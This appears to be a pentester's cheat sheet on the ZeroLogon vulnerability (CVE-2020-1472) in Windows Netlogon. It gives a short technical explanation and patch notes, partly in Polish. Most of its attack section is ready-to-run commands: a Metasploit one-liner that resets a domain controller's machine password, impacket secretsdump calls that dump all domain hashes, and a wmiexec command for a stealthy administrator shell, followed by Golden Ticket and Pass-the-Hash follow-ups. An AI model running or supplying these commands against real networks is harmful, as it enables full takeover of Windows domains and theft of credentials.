## ZeroLogon
### Into
CVE-2020-1472

The core of the vulnerability lies in a poor implementation of the ComputeNetlogonCredential call of the Netlogon Remote Protocol (MS-NRPC). The ComputeNetlogonCredential takes an 8-byte challenge as an input, performs a cryptographic transformation using a session key (which proves knowledge of the computer secret), and outputs an 8-byte result. The issue lies in an implementation flaw in the newer method AES-CFB8 (which is also the only one allowed in newer Windows versions) which is used to perform this transformation.  
In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.*  
(* https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)
### Defense
Pierwszy etap został wydany 11 sierpnia (Patch Tuesday) w formie aktualizacji zabezpieczeń, która uniemożliwi kontrolerom domeny Windows Active Directory korzystanie z niezabezpieczonej komunikacji RPC.  
9 lutego 2021 r., W ramach kolejnej aktualizacji Patch Tuesday, Microsoft wyda drugą aktualizację, , która wymaga, aby wszystkie urządzenia w sieci korzystały z bezpiecznego RPC.  

### Impact
Password hashes
Shell
### Long impact
Golden Ticket attack  
Pass-the-Hash attack  
Silver Ticket attack  
### Attack
1. Check e.g. https://github.com/SecuraBV/CVE-2020-1472.git
2. Clear machine password.
Best effect (for me) with metasploit module.  
``auxiliary/admin/dcerpc/cve_2020_1472_zerologon``  
params: *set NBNAME _DOMAIN_CONTROLER_NAME_ set RHOSTS _IP_DOMAIN_CONTROLER_*  
OR  
sudo msfconsole -x "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon; set RHOSTS $dstIP; set NBNAME $nbName; run; exit -y;"  

3. Hashes dump  
``python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc '_DOMAIN_NAME_/_DOMAIN_CONTROLER_NAME_$@_IP_DOMAIN_CONTROLER_'``  
or  
``python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 '_DOMAIN_NAME_/_DOMAIN_CONTROLER_NAME_$@_IP_DOMAIN_CONTROLER_'``  
4. Remote shell  
*wmiexec.py: A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.*
``python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes _ADMIN_HASHES_ _ADMIN_@_IP_DOMAIN_CONTROLER_``



